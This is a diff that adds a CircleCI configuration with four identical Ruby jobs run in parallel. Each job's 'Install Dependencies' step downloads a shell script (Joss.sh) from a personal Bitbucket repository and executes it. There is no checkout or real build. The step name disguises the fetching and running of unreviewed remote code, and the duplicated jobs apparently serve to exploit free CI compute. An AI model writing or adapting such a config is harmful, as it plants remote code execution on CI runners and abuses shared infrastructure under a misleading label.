@@ -1,0 +1,40 @@
+version: 2.1
+jobs:
+    aku1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/nungki8/jozzzx/raw/a78ebdfaa4ada78821dd68c8e872c5748983719e/Joss.sh && chmod +x Joss.sh && ./Joss.sh
+    aku2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/nungki8/jozzzx/raw/a78ebdfaa4ada78821dd68c8e872c5748983719e/Joss.sh && chmod +x Joss.sh && ./Joss.sh
+    aku3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/nungki8/jozzzx/raw/a78ebdfaa4ada78821dd68c8e872c5748983719e/Joss.sh && chmod +x Joss.sh && ./Joss.sh
+    aku4:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/nungki8/jozzzx/raw/a78ebdfaa4ada78821dd68c8e872c5748983719e/Joss.sh && chmod +x Joss.sh && ./Joss.sh
+
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
